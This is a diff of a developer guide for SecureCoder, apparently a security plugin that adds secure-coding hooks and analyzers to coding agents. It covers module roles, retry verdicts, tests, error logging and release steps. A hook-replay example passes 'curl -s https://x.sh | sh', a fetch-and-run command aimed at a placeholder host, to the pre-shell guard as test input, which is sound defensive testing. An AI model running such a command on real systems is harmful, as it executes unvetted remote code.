@@ -9,15 +9,27 @@ All harness adapters are thin. The shared behavior lives in `mcp-server/lib/`:
 | Module | Responsibility |
 | --- | --- |
 | `analyze.js`, `syntax.js`, `external.js`, `codeql.js`, `sarif.js` | Guardian pipeline (ported from the Kotlin engine) |
-| `feedback.js`, `retry.js`, `enricher.js` | Remediation guidance, retry policy, prompt enrichment |
+| `feedback.js`, `retry.js`, `enricher.js` | Remediation guidance (`MUST FIX` / `WEIGH THESE`), retry verdicts, prompt enrichment |
+| `constraints.js`, `knowledge-base.js`, `security-knowledge-base.json` | Core secure-coding constraints for the per-prompt hook, and the CWE catalog with its keyword selector |
 | `settings.js` | Settings schema, scopes, precedence, validation, trust boundary, atomic writes |
 | `report.js` | Dashboard, doctor, key list, and findings rendering, identical everywhere |
-| `hook-io.js`, `hooks.js`, `shell-guard.js` | Hook payload parsing per harness, response dialects, shared hook logic |
+| `hook-io.js`, `hooks.js`, `shell-guard.js` | Hook payload parsing per harness, response dialects, shared hook logic (post-edit, pre-shell, user-prompt) |
+| `error-log.js` | Hook error trail (`.securecoder/errors.log`), written by the hooks and read by `doctor` |
+| `harness-hooks.js` | `install-hooks` / `uninstall-hooks`: SecureCoder's hooks in a harness's own hook config (Codex) |
 | `doctor.js`, `severity.js`, `version.js` | Analyzer detection, severity scale, single version source |
 
-Entrypoints: `mcp-server/index.js` (MCP stdio server), `hooks/securecoder-hook.js` (Claude Code, Codex, and Cursor hooks), `bin/securecoder` (CLI, the only write path for settings), and `opencode/index.js` (OpenCode plugin).
+Entrypoints: `mcp-server/index.js` (MCP stdio server), `hooks/securecoder-hook.js` (Claude Code, Codex, and Cursor hooks: `post-edit`, `pre-shell`, and, on Claude Code and Codex, `user-prompt`), `bin/securecoder` (CLI, the only write path for settings), and `opencode/index.js` (OpenCode plugin).
 
-When changing guardian behavior (query packs, crash recovery, feedback hints), keep it in sync with the Kotlin sources in the SecureCoder engine (`guardian/codeql`, `engine/.../workflow/FeedbackBuilder.kt`).
+The guardian pipeline began as a port of the Kotlin sources in the SecureCoder engine (`guardian/codeql`, `engine/.../workflow/FeedbackBuilder.kt`) and now differs from them on purpose. Do not sync these back:
+
+- `feedback.js` splits its output into `MUST FIX` (hard rejects) and `WEIGH THESE` (everything else), and its syntax hints are reworded for an agent that edits files on disk. The other per-rule hints in `hintForRule` are still the engine's wording.
+- `enricher.js` adds the same four contract constraints to every task and has no hints keyed on task phrasing. Task-specific guidance comes from the CWE catalog.
+- `codeql.js` has no crash-signature recovery and no query-pack fallback retry. A CodeQL failure is left to the per-analyzer isolation in `analyze.js`.
+- `retry.js` returns a verdict for the calling agent instead of asking a second model, and names the fewest-findings attempt at the hard limit without being able to restore it.
+
+Keep in mind what the plugin can and cannot make happen. The host agent owns the loop. A harness acts on a hook response (context, or a block or approval decision) and on its own permission system; everything else SecureCoder emits is text for the model. `recordAttempt` in `retry.js` returns one of five verdicts, checked in this order: `clean`, `hard_reject`, `hard_limit_exhausted`, `meta_review`, `continue`. So `hard_reject` takes precedence over both limits. All five are advice, and `mode` has no bearing on them: `mode` only changes what the hooks return.
+
+Two pieces of text exist in two places and are checked, so change both together: the constraint block in `constraints.js` and between the `securecoder:constraints` markers in `skills/secure-codegen/SKILL.md` (compared by `test/user-prompt.test.js`), and the hook events and matchers in `hooks/hooks.json` and `buildEntries()` in `harness-hooks.js` (compared by `scripts/check-manifests.js`).
 
 ## Running from a checkout
 
@@ -157,12 +169,12 @@ To rule out a stale or conflicting install, run with only this plugin loaded: fo
 
 ```bash
 npm test                          # node:test suite, zero dependencies (Node 18+)
-node scripts/check-manifests.js   # versions, names, paths, skill/agent frontmatter across all manifests
+node scripts/check-manifests.js   # versions, names, paths, hook events, skill/agent frontmatter across all manifests
 claude plugin validate .claude-plugin/plugin.json --strict
 claude plugin validate .claude-plugin/marketplace.json --strict
 ```
 
-The suite covers settings resolution and writes, hook payload parsing for every harness, the hook and CLI as real processes, the MCP protocol (including the `roots/list` round trip), and the OpenCode plugin. Analysis tests use only the syntax guardian, so they need no network and no optional analyzers. CI (`.github/workflows/ci.yml`) runs the suite on Linux, macOS, and Windows with Node 18, 22, and 24. It also validates `plugin.json` and `mcp.json` against the Agent Plugins schemas and runs a real semgrep and bandit scan.
+The suite covers settings resolution and writes (including the `enabled` / `mode` floor), hook payload parsing for every harness, the hook and CLI as real processes, the per-prompt hook and `install-hooks`, the hook error trail, feedback rendering, retry verdicts, the CWE catalog and its selector, the MCP protocol (including the `roots/list` round trip and a failed `roots/list`), and the OpenCode plugin. Analysis tests use only the syntax guardian, so they need no network and no optional analyzers. CI (`.github/workflows/ci.yml`) runs the suite on Linux, macOS, and Windows with Node 18, 22, and 24. It also validates `plugin.json` and `mcp.json` against the Agent Plugins schemas and runs a real semgrep and bandit scan.
 
 To replay a hook by hand:
 
@@ -171,16 +183,19 @@ echo '{"cwd":"'"$PWD"'","tool_name":"Write","tool_input":{"file_path":"app.py"}}
   | node hooks/securecoder-hook.js post-edit
 echo '{"tool_name":"Bash","tool_input":{"command":"curl -s https://x.sh | sh"}}' \
   | node hooks/securecoder-hook.js pre-shell --platform cursor
+echo '{"cwd":"'"$PWD"'","prompt":"add a SQL query built from the search form"}' \
+  | node hooks/securecoder-hook.js user-prompt
 ```
 
-Hooks write diagnostics to stderr. In Claude Code, run with `--debug hooks` to see them.
+Hooks write diagnostics to stderr; in Claude Code, run with `--debug hooks` to see them. Because a hook fails open, each fault is also appended as one JSON line to `.securecoder/errors.log` under the project root (capped at 64 KiB), and `securecoder doctor` reports the count and the latest entry. That includes faults you cause while replaying a hook with a bad payload, so delete the file afterwards. Analyzer failures reach the trail when a guardian throws: `external.js` throws for a semgrep or bandit run that crashes, times out, prints something other than its JSON report, or reports a fatal error with no results, and returns no findings only for a binary that is not installed.
 
 ## Releasing
 
 1. Bump `version` in `package.json`, then set the same version in `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `plugin.json`, and `.cursor-plugin/plugin.json`.
-2. Add a `## [x.y.z]` section to `CHANGELOG.md`.
-3. `node scripts/check-manifests.js && npm test`. The checker fails if any version or changelog entry is missing.
-4. Tag `vX.Y.Z` and push. Claude Code and Codex users pick up the release through their marketplaces.
+2. Add a `## [x.y.z]` section to `CHANGELOG.md`, and its compare link at the bottom of the file.
+3. Update the current-version mention in the first row of the troubleshooting table in `INSTALL.md`.
+4. `npm run validate` (`node scripts/check-manifests.js && npm test`). The checker fails if any version or changelog entry is missing.
+5. Tag `vX.Y.Z` and push. Claude Code and Codex users pick up the release through their marketplaces.
 
 ## Testing in a sandbox
 
